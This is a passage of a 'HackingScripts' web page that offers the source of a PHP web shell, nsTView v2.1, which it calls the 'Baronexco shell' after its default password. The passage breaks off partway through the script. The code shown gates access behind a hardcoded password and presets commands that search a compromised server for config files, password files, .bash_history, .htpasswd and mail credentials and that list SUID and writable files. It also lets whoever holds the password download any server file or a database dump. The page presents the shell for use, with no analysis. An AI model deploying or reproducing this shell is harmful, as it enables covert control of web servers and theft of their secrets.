<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> Baronexco shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>Baronexco shell</h2>
<p class="meta">11 Feb 2014</p>

<p>I don&#8217;t know what this script is called, but the default password seems to be &#8216;baronexco&#8217;, so that&#8217;s the name I&#8217;ve give it.</p>

<h3>Baronexco Shell Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">   1</span> <span class="cp">&lt;?</span>
<span class="lineno">   2</span> <span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>
<span class="lineno">   3</span> <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">   4</span> <span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="lineno">   5</span> <span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span> <span class="o">&amp;</span> <span class="o">~</span><span class="nx">E_NOTICE</span><span class="p">);</span>
<span class="lineno">   6</span> 
<span class="lineno">   7</span> <span class="c1">###</span>
<span class="lineno">   8</span> <span class="c1">####cfg</span>
<span class="lineno">   9</span> <span class="c1">###</span>
<span class="lineno">  10</span> <span class="c1">####</span>
<span class="lineno">  11</span> <span class="c1"># use password  true / false #</span>
<span class="lineno">  12</span> <span class="nv">$create_password</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">  13</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&quot;baronexco&quot;</span><span class="p">;</span>    <span class="c1">// default password for nstview, you can change it.</span>
<span class="lineno">  14</span> 
<span class="lineno">  15</span> <span class="c1"># UNIX COMMANDS</span>
<span class="lineno">  16</span> <span class="c1"># description (nst) command</span>
<span class="lineno">  17</span> <span class="c1"># example: Shutdown (nst) shutdown -h now</span>
<span class="lineno">  18</span> <span class="nv">$fast_commands</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="lineno">  19</span> <span class="s2">Show open ports (nst) netstat -an | grep LISTEN | grep tcp</span>
<span class="lineno">  20</span> <span class="s2">last root (nst) last root</span>
<span class="lineno">  21</span> <span class="s2">last (all users) (nst) last all</span>
<span class="lineno">  22</span> <span class="s2">Find all config.php in / (nst) find / -type f -name config.php</span>
<span class="lineno">  23</span> <span class="s2">Find all config.php in . (nst) find . -type f -name config.php</span>
<span class="lineno">  24</span> <span class="s2">Find all admin.php in / (nst) find / -type f -name admin.php</span>
<span class="lineno">  25</span> <span class="s2">Find all admin.php in . (nst) find . -type f -name admin.php</span>
<span class="lineno">  26</span> <span class="s2">Find all config.inc.php in / (nst) find / -type f -name config.inc.php</span>
<span class="lineno">  27</span> <span class="s2">Find all config.inc.php in . (nst) find . -type f -name config.inc.php</span>
<span class="lineno">  28</span> <span class="s2">Find all config.inc in / (nst) find / -type f -name config.inc</span>
<span class="lineno">  29</span> <span class="s2">Find all config.inc in . (nst) find . -type f -name config.inc</span>
<span class="lineno">  30</span> <span class="s2">Find all config.dat in / (nst) find / -type f -name config.dat</span>
<span class="lineno">  31</span> <span class="s2">Find all config.dat in . (nst) find . -type f -name config.dat</span>
<span class="lineno">  32</span> <span class="s2">Find all config* in / (nst) find / -type f -name config*</span>
<span class="lineno">  33</span> <span class="s2">Find all config* in . (nst) find . -type f -name config*</span>
<span class="lineno">  34</span> <span class="s2">Find all pass* in / (nst) find / -type f -name pass*</span>
<span class="lineno">  35</span> <span class="s2">Find all pass* in . (nst) find . -type f -name pass*</span>
<span class="lineno">  36</span> <span class="s2">Find all .bash_history in / (nst) find / -type f -name .bash_history</span>
<span class="lineno">  37</span> <span class="s2">Find all .bash_history in . (nst) find . -type f -name .bash_history</span>
<span class="lineno">  38</span> <span class="s2">Find all .htpasswd  in / (nst) find / -type f -name .htpasswd</span>
<span class="lineno">  39</span> <span class="s2">Find all .htpasswd  in . (nst) find . -type f -name .htpasswd</span>
<span class="lineno">  40</span> <span class="s2">Find all writable dirs/files in / (nst) find / -perm -2 -ls</span>
<span class="lineno">  41</span> <span class="s2">Find all writable dirs/files in . (nst) find . -perm -2 -ls</span>
<span class="lineno">  42</span> <span class="s2">Find all suid files in / (nst) find / -type f -perm -04000 -ls</span>
<span class="lineno">  43</span> <span class="s2">Find all suid files in . (nst) find . -type f -perm -04000 -ls</span>
<span class="lineno">  44</span> <span class="s2">Find all sgid files in / (nst) find / -type f -perm -02000 -ls</span>
<span class="lineno">  45</span> <span class="s2">Find all sgid files in . (nst) find . -type f -perm -02000 -ls</span>
<span class="lineno">  46</span> <span class="s2">Find all .fetchmailrc files in / (nst) find / -type f -name .fetchmailrc</span>
<span class="lineno">  47</span> <span class="s2">Find all .fetchmailrc files in . (nst) find . -type f -name .fetchmailrc</span>
<span class="lineno">  48</span> <span class="s2">OS Version? (nst) sysctl -a | grep version</span>
<span class="lineno">  49</span> <span class="s2">Kernel version? (nst) cat /proc/version</span>
<span class="lineno">  50</span> <span class="s2">cat syslog.conf (nst) cat /etc/syslog.conf</span>
<span class="lineno">  51</span> <span class="s2">Cat - Message of the day (nst) cat /etc/motd</span>
<span class="lineno">  52</span> <span class="s2">Cat hosts (nst) cat /etc/hosts</span>
<span class="lineno">  53</span> <span class="s2">Distrib name (nst) cat /etc/issue.net</span>
<span class="lineno">  54</span> <span class="s2">Distrib name (2) (nst) cat /etc/*-realise</span>
<span class="lineno">  55</span> <span class="s2">Display all process - wide output (nst) ps auxw</span>
<span class="lineno">  56</span> <span class="s2">Display all your process (nst) ps ux</span>
<span class="lineno">  57</span> <span class="s2">Interfaces (nst) ifconfig</span>
<span class="lineno">  58</span> <span class="s2">CPU? (nst) cat /proc/cpuinfo</span>
<span class="lineno">  59</span> <span class="s2">RAM (nst) free -m</span>
<span class="lineno">  60</span> <span class="s2">HDD space (nst) df -h</span>
<span class="lineno">  61</span> <span class="s2">List of Attributes (nst) lsattr -a</span>
<span class="lineno">  62</span> <span class="s2">Mount options (nst) cat /etc/fstab</span>
<span class="lineno">  63</span> <span class="s2">Is cURL installed? (nst) which curl</span>
<span class="lineno">  64</span> <span class="s2">Is wGET installed? (nst) which wget</span>
<span class="lineno">  65</span> <span class="s2">Is lynx installed? (nst) which lynx</span>
<span class="lineno">  66</span> <span class="s2">Is links installed? (nst) which links</span>
<span class="lineno">  67</span> <span class="s2">Is fetch installed? (nst) which fetch</span>
<span class="lineno">  68</span> <span class="s2">Is GET installed? (nst) which GET</span>
<span class="lineno">  69</span> <span class="s2">Is perl installed? (nst) which perl</span>
<span class="lineno">  70</span> <span class="s2">Where is apache (nst) whereis apache</span>
<span class="lineno">  71</span> <span class="s2">Where is perl (nst) whereis perl</span>
<span class="lineno">  72</span> <span class="s2">locate proftpd.conf (nst) locate proftpd.conf</span>
<span class="lineno">  73</span> <span class="s2">locate httpd.conf (nst) locate httpd.conf</span>
<span class="lineno">  74</span> <span class="s2">locate my.conf (nst) locate my.conf</span>
<span class="lineno">  75</span> <span class="s2">locate psybnc.conf (nst) locate psybnc.conf</span>
<span class="lineno">  76</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">  77</span> 
<span class="lineno">  78</span> 
<span class="lineno">  79</span> 
<span class="lineno">  80</span> <span class="c1"># WINDOWS COMMANDS</span>
<span class="lineno">  81</span> <span class="c1"># description (nst) command</span>
<span class="lineno">  82</span> <span class="c1"># example: Delete autoexec.bat (nst) del c:\autoexec.bat</span>
<span class="lineno">  83</span> <span class="nv">$fast_commands_win</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="lineno">  84</span> <span class="s2">OS Version (nst) ver</span>
<span class="lineno">  85</span> <span class="s2">Tasklist  (nst) tasklist</span>
<span class="lineno">  86</span> <span class="s2">Attributes in . (nst) attrib</span>
<span class="lineno">  87</span> <span class="s2">Show open ports (nst) netstat -an</span>
<span class="lineno">  88</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">  89</span> 
<span class="lineno">  90</span> 
<span class="lineno">  91</span> 
<span class="lineno">  92</span> 
<span class="lineno">  93</span> 
<span class="lineno">  94</span> 
<span class="lineno">  95</span> <span class="c1">###</span>
<span class="lineno">  96</span> <span class="c1">###</span>
<span class="lineno">  97</span> <span class="c1">###ver</span>
<span class="lineno">  98</span> <span class="c1">###</span>
<span class="lineno">  99</span> <span class="c1">###</span>
<span class="lineno"> 100</span> <span class="nv">$ver</span><span class="o">=</span> <span class="s2">&quot;v2.1&quot;</span><span class="p">;</span>
<span class="lineno"> 101</span> 
<span class="lineno"> 102</span> <span class="c1">###</span>
<span class="lineno"> 103</span> <span class="c1">###</span>
<span class="lineno"> 104</span> <span class="c1">###</span>
<span class="lineno"> 105</span> <span class="c1">###</span>
<span class="lineno"> 106</span> <span class="c1">###</span>
<span class="lineno"> 107</span> <span class="c1">####</span>
<span class="lineno"> 108</span> <span class="nv">$pass</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
<span class="lineno"> 109</span> <span class="k">if</span><span class="p">(</span><span class="nv">$pass</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
<span class="lineno"> 110</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">$pass</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 111</span> <span class="p">}</span>
<span class="lineno"> 112</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_CLIENT_IP&quot;</span><span class="p">])</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_CLIENT_IP&quot;</span><span class="p">];</span>
<span class="lineno"> 113</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_X_FORWARDED_FOR&quot;</span><span class="p">])</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_X_FORWARDED_FOR&quot;</span><span class="p">];</span>
<span class="lineno"> 114</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">])</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">];</span>
<span class="lineno"> 115</span> <span class="k">else</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
<span class="lineno"> 116</span> <span class="nv">$ip</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$ip</span><span class="p">);</span>
<span class="lineno"> 117</span> 
<span class="lineno"> 118</span> <span class="k">if</span><span class="p">(</span><span class="nv">$create_password</span><span class="o">==</span><span class="k">true</span><span class="p">){</span>
<span class="lineno"> 119</span> 
<span class="lineno"> 120</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">])</span> <span class="k">or</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;nst&#39;</span><span class="p">]</span><span class="o">!=</span><span class="nv">$password</span><span class="p">){</span>
<span class="lineno"> 121</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;</span>
<span class="lineno"> 122</span> <span class="s2">&lt;title&gt;nsTView </span><span class="si">$ver</span><span class="s2">:: nst.void.ru&lt;/title&gt;</span>
<span class="lineno"> 123</span> <span class="s2">&lt;center&gt;</span>
<span class="lineno"> 124</span> <span class="s2">&lt;table width=100 bgcolor=#D7FFA8 border=1 bordercolor=black&gt;&lt;tr&gt;&lt;td&gt;</span>
<span class="lineno"> 125</span> <span class="s2">&lt;font size=1 face=verdana&gt;&lt;center&gt;</span>
<span class="lineno"> 126</span> <span class="s2">&lt;b&gt;nsTView </span><span class="si">$ver</span><span class="s2"> :: &lt;a href=http://nst.void.ru style=&#39;text-decoration:none;&#39;&gt;&lt;font color=black&gt;nst.void.ru&lt;/font&gt;&lt;/a&gt;&lt;br&gt;&lt;/b&gt;</span>
<span class="lineno"> 127</span> <span class="s2">&lt;/center&gt;</span>
<span class="lineno"> 128</span> <span class="s2">&lt;form method=post&gt;</span>
<span class="lineno"> 129</span> <span class="s2">Password:&lt;br&gt;</span>
<span class="lineno"> 130</span> <span class="s2">&lt;input type=password name=pass size=30 tabindex=1&gt;</span>
<span class="lineno"> 131</span> <span class="s2">&lt;/form&gt;</span>
<span class="lineno"> 132</span> <span class="s2">&lt;b&gt;Host:&lt;/b&gt; &quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;</span>
<span class="lineno"> 133</span> <span class="s2">&lt;b&gt;IP:&lt;/b&gt; &quot;</span><span class="o">.</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;</span>
<span class="lineno"> 134</span> <span class="s2">&lt;b&gt;Your ip:&lt;/b&gt; &quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno"> 135</span> <span class="s2">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span>
<span class="lineno"> 136</span> <span class="s2">&quot;</span><span class="p">);}</span>
<span class="lineno"> 137</span> 
<span class="lineno"> 138</span> <span class="p">}</span>
<span class="lineno"> 139</span> <span class="nv">$d</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">];</span>
<span class="lineno"> 140</span> 
<span class="lineno"> 141</span> <span class="k">function</span> <span class="nf">adds</span><span class="p">(</span><span class="nv">$editf</span><span class="p">){</span>
<span class="lineno"> 142</span> <span class="c1">#if(get_magic_quotes_gpc()==0){</span>
<span class="lineno"> 143</span> <span class="nv">$editf</span><span class="o">=</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$editf</span><span class="p">);</span>
<span class="lineno"> 144</span> <span class="c1">#}</span>
<span class="lineno"> 145</span> <span class="k">return</span> <span class="nv">$editf</span><span class="p">;</span>
<span class="lineno"> 146</span> <span class="p">}</span>
<span class="lineno"> 147</span> <span class="k">function</span> <span class="nf">adds2</span><span class="p">(</span><span class="nv">$editf</span><span class="p">){</span>
<span class="lineno"> 148</span> <span class="k">if</span><span class="p">(</span><span class="nb">get_magic_quotes_gpc</span><span class="p">()</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
<span class="lineno"> 149</span> <span class="nv">$editf</span><span class="o">=</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$editf</span><span class="p">);</span>
<span class="lineno"> 150</span> <span class="p">}</span>
<span class="lineno"> 151</span> <span class="k">return</span> <span class="nv">$editf</span><span class="p">;</span>
<span class="lineno"> 152</span> <span class="p">}</span>
<span class="lineno"> 153</span> 
<span class="lineno"> 154</span> <span class="nv">$f</span>   <span class="o">=</span> <span class="s2">&quot;nst_sql.txt&quot;</span><span class="p">;</span>
<span class="lineno"> 155</span> <span class="nv">$f_d</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f_d&#39;</span><span class="p">];</span>
<span class="lineno"> 156</span> 
<span class="lineno"> 157</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;download&#39;</span><span class="p">]){</span>
<span class="lineno"> 158</span> <span class="nv">$download</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;download&#39;</span><span class="p">];</span>
<span class="lineno"> 159</span> <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="si">$download\</span><span class="s2">&quot;</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="lineno"> 160</span> <span class="s2">readfile(&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$download</span><span class="s2">&quot;);</span>
<span class="lineno"> 161</span> <span class="s2">exit;}</span>
<span class="lineno"> 162</span> 
<span class="lineno"> 163</span> <span class="s2">if(</span><span class="si">$_GET[&#39;dump_download&#39;]</span><span class="s2">){</span>
<span class="lineno"> 164</span> <span class="s2">header(&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">disposition</span><span class="o">:</span> <span class="nx">attachment</span><span class="p">;</span> <span class="nx">filename</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$f\</span><span class="s2">&quot;</span><span class="p">;</span><span class="s2">&quot;);</span>
<span class="lineno"> 165</span> <span class="s2">header(&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">length</span><span class="o">:</span> <span class="s2">&quot;.filesize(</span><span class="si">$f_d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$f</span><span class="s2">));</span>
<span class="lineno"> 166</span> <span class="s2">header(&quot;</span><span class="nx">Expires</span><span class="o">:</span> <span class="mi">0</span><span class="s2">&quot;);</span>
<span class="lineno"> 167</span> <span class="s2">readfile(</span><span class="si">$f_d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$f</span><span class="s2">);</span>
<span class="lineno"> 168</span> <span class="s2">if(is_writable(</span><span class="si">$f_d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$f</span><span class="s2">)){</span>
<span class="lineno"> 169</span> <span class="s2">unlink(</span><span class="si">$f_d</span><span class="s2">.&quot;</span><span class="o">/</span><span class="s2">&quot;.</span><span class="si">$f</span><span class="s2">);</span>
<span class="lineno"> 170</span> <span class="s2">}</span>
<span class="lineno"> 171</span> <span class="s2">die;</span>
<span class="lineno"> 172</span> <span class="s2">}</span>
<span class="lineno"> 173</span> 
<span class="lineno"> 174</span> 
<span class="lineno"> 175</span> <span class="si">$images</span><span class="s2">=array(&quot;</span><span class="o">.</span><span class="nx">gif</span><span class="s2">&quot;,&quot;</span><span class="o">.</span><span class="nx">jpg</span><span class="s2">&quot;,&quot;</span><span class="o">.</span><span class="nx">png</span><span class="s2">&quot;,&quot;</span><span class="o">.</span><span class="nx">bmp</span><span class="s2">&quot;,&quot;</span><span class="o">.</span><span class="nx">jpeg</span><span class="s2">&quot;);</span>
<span class="lineno"> 176</span> <span class="si">$whereme</span><span class="s2">=getcwd();</span>
<span class="lineno"> 177</span> <span class="s2">@</span><span class="si">$d</span><span class="s2">=@</span><span class="si">$_GET[&#39;d&#39;]</span><span class="s2">;</span>
<span class="lineno"> 178</span> <span class="si">$copyr</span><span class="s2"> = &quot;</span><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="nx">http</span><span class="o">://</span><span class="nx">nst</span><span class="o">.</span><span class="nx">void</span><span class="o">.</span><span class="nx">ru</span> <span class="nx">target</span><span class="o">=</span><span class="nx">_blank</span><span class="o">&gt;</span><span class="nx">nsTView</span> <span class="nv">$ver</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="nx">o</span><span class="o">...</span> <span class="nx">Network</span> <span class="nx">security</span> <span class="nx">team</span> <span class="o">...</span><span class="nx">o</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno"> 179</span> <span class="si">$php_self</span><span class="s2">=@</span><span class="si">$_SERVER[&#39;PHP_SELF&#39;]</span><span class="s2">;</span>
<span class="lineno"> 180</span> <span class="s2">if(@eregi(&quot;</span><span class="o">/</span><span class="s2">&quot;,</span><span class="si">$whereme</span><span class="s2">))</span><span class="si">{</span><span class="nv">$os</span><span class="o">=</span><span class="s2">&quot;unix&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2">else</span><span class="si">{</span><span class="nv">$os</span><span class="o">=</span><span class="s2">&quot;win&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 181</span> <span class="s2">if(!isset(</span><span class="si">$d</span><span class="s2">))</span><span class="si">{</span><span class="nv">$d</span><span class="o">=</span><span class="nv">$whereme</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno"> 182</span> <span class="si">$d</span><span class="s2">=str_replace(&quot;</span><span class="nx">\\</span><span class="s2">&quot;,&quot;</span><span class="o">/</span><span class="s2">&quot;,</span><span class="si">$d</span><span class="s2">);</span>
<span class="lineno"> 183</span> <span class="s2">if(@</span><span class="si">$_GET[&#39;p&#39;]</span><span class="s2">==&quot;</span><span class="nx">info</span><span class="s2">&quot;){</span>
<span class="lineno"> 184</span> <span class="s2">@phpinfo();</span>
<span class="lineno"> 185</span> <span class="s2">exit;}</span>
<span class="lineno"> 186</span> <span class="s2">if(@</span><span class="si">$_GET[&#39;img&#39;]</span><span class="s2">==&quot;</span><span class="mi">1</span><span class="s2">&quot;){</span>
<span class="lineno"> 187</span> <span class="s2">@</span><span class="si">$e</span><span class="s2">=</span><span class="si">$_GET[&#39;e&#39;]</span><span class="s2">;</span>
<span class="lineno"> 188</span> <span class="s2">header(&quot;</span><span class="nx">Content</span><span class="o">-</span><span class="nx">type</span><span class="o">:</span> <span class="nx">image</span><span class="o">/</span><span class="nx">gif</span><span class="s2">&quot;);</span>
<span class="lineno"> 189</span> <span class="s2">readfile(&quot;</span><span class="nv">$d</span><span class="o">/</span><span class="nv">$e</span><span class="s2">&quot;);</span>
<span class="lineno"> 190</span> <span class="s2">}</span>
<span class="lineno"> 191</span> <span class="s2">if(@</span><span class="si">$_GET[&#39;getdb&#39;]</span><span class="s2">==&quot;</span><span class="mi">1</span><span class="s2">&quot;){</span>
<span class="lineno"> 192</span> <span class="s2">header(&#39;Content-type: application/plain-text&#39;);</span>
<span class="lineno"> 193</span> <span class="s2">header(&#39;Content-Disposition: attachment; filename=nst-mysql-damp.htm&#39;);</span>
<span class="lineno"> 194</span> <span class="s2">}</span>
<span class="lineno"> 195</span> <span class="s2">print &quot;</span><span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">nsT</span> <span class="nx">View</span> <span class="nv">$ver</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
<span class="lineno"> 196</span> <span class="o">&lt;</span><span class="nx">style</span><span class="o">&gt;</span>
<span class="lineno"> 197</span> <span class="nx">BODY</span><span class="p">,</span> <span class="nx">TD</span><span class="p">,</span> <span class="nx">TR</span> <span class="p">{</span>
<span class="lineno"> 198</span> <span class="nx">text</span><span class="o">-</span><span class="nx">decoration</span><span class="o">:</span> <span class="nx">none</span><span class="p">;</span>
<span class="lineno"> 199</span> <span class="nx">font</span><span class="o">-</span><span class="nx">family</span><span class="o">:</span> <span class="nx">Verdana</span><span class="p">;</span>
<span class="lineno"> 200</span> <span class="nx">font</span><span class="o">-</span><span class="nx">size</span><span class="o">:</span> <span class="mi">8</span><span class="nx">pt</span><span class="p">;</span>
<span class="lineno"> 201</span> <span class="nx">SCROLLBAR</span><span class="o">-</span><span class="nx">FACE</span><span class="o">-</span><span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#363d4e;</span>
<span class="lineno"> 202</span> <span class="nx">SCROLLBAR</span><span class="o">-</span><span class="nx">HIGHLIGHT</span><span class="o">-</span><span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#363d4e;</span>
<span class="lineno"> 203</span> <span class="nx">SCROLLBAR</span><span class="o">-</span><span class="nx">SHADOW</span><span class="o">-</span><span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#363d4e;</span>
<span class="lineno"> 204</span> <span class="nx">SCROLLBAR</span><span class="o">-</span><span class="nx">ARROW</span><span class="o">-</span><span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#363d4e;</span>
<span class="lineno"> 205</span> <span class="nx">SCROLLBAR</span><span class="o">-</span><span class="nx">TRACK</span><span class="o">-</span><span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#91AAFF</span>
<span class="lineno"> 206</span> <span class="p">}</span>
<span class="lineno"> 207</span> <span class="nx">input</span><span class="p">,</span> <span class="nx">textarea</span><span class="p">,</span> <span class="nx">select</span> <span class="p">{</span>
<span class="lineno"> 208</span> <span class="nx">font</span><span class="o">-</span><span class="nx">family</span><span class="o">:</span> <span class="nx">Verdana</span><span class="p">;</span>
<span class="lineno"> 209</span> <span class="nx">font</span><span class="o">-</span><span class="nx">size</span><span class="o">:</span> <span class="mi">10</span><span class="nx">px</span><span class="p">;</span>
<span class="lineno"> 210</span> <span class="nx">color</span><span class="o">:</span> <span class="nx">black</span><span class="p">;</span>
<span class="lineno"> 211</span> <span class="nx">background</span><span class="o">-</span><span class="nx">color</span><span class="o">:</span> <span class="nx">white</span><span class="p">;</span>
<span class="lineno"> 212</span> <span class="nx">border</span><span class="o">:</span> <span class="nx">solid</span> <span class="mi">1</span><span class="nx">px</span><span class="p">;</span>
<span class="lineno"> 213</span> <span class="nx">border</span><span class="o">-</span><span class="nx">color</span><span class="o">:</span> <span class="nx">black</span>
<span class="lineno"> 214</span> <span class="p">}</span>
<span class="lineno"> 215</span> <span class="nx">UNKNOWN</span> <span class="p">{</span>
<span class="lineno"> 216</span> <span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#0006DE;</span>
<span class="lineno"> 217</span> <span class="nx">TEXT</span><span class="o">-</span><span class="nx">DECORATION</span><span class="o">:</span> <span class="nx">none</span>
<span class="lineno"> 218</span> <span class="p">}</span>
<span class="lineno"> 219</span> <span class="nx">A</span><span class="o">:</span><span class="nb">link</span> <span class="p">{</span>
<span class="lineno"> 220</span> <span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#0006DE;</span>
<span class="lineno"> 221</span> <span class="nx">TEXT</span><span class="o">-</span><span class="nx">DECORATION</span><span class="o">:</span> <span class="nx">none</span>
<span class="lineno"> 222</span> <span class="p">}</span>
<span class="lineno"> 223</span> <span class="nx">A</span><span class="o">:</span><span class="nx">hover</span> <span class="p">{</span>
<span class="lineno"> 224</span> <span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#FF0C0B;</span>
<span class="lineno"> 225</span> <span class="nx">TEXT</span><span class="o">-</span><span class="nx">DECORATION</span><span class="o">:</span> <span class="nx">none</span>
<span class="lineno"> 226</span> <span class="p">}</span>
<span class="lineno"> 227</span> <span class="nx">A</span><span class="o">:</span><span class="nx">active</span> <span class="p">{</span>
<span class="lineno"> 228</span> <span class="nx">COLOR</span><span class="o">:</span> <span class="c1">#0006DE;</span>
<span class="lineno"> 229</span> <span class="nx">TEXT</span><span class="o">-</span><span class="nx">DECORATION</span><span class="o">:</span> <span class="nx">none</span>
<span class="lineno"> 230</span> <span class="p">}</span>
<span class="lineno"> 231</span> <span class="nx">A</span><span class="o">:</span><span class="nx">visited</span> <span class="p">{</span>
<span class="lineno"> 232</span> <span class="nx">TEXT</span><span class="o">-</span><span class="nx">DECORATION</span><span class="o">:</span> <span class="nx">none</span>
<span class="lineno"> 233</span> <span class="p">}</span>
<span class="lineno"> 234</span> <span class="o">&lt;/</span><span class="nx">style</span><span class="o">&gt;</span>
<span class="lineno"> 235</span> <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="lineno"> 236</span> <span class="k">function</span> <span class="nf">ShowOrHide</span><span class="p">(</span><span class="nx">d1</span><span class="p">,</span> <span class="nx">d2</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 237</span> <span class="k">if</span> <span class="p">(</span><span class="nx">d1</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="nx">DoDiv</span><span class="p">(</span><span class="nx">d1</span><span class="p">);</span>
<span class="lineno"> 238</span> <span class="k">if</span> <span class="p">(</span><span class="nx">d2</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="nx">DoDiv</span><span class="p">(</span><span class="nx">d2</span><span class="p">);}</span>
<span class="lineno"> 239</span> 
<span class="lineno"> 240</span> <span class="k">function</span> <span class="nf">DoDiv</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 241</span> <span class="k">var</span> <span class="nx">item</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
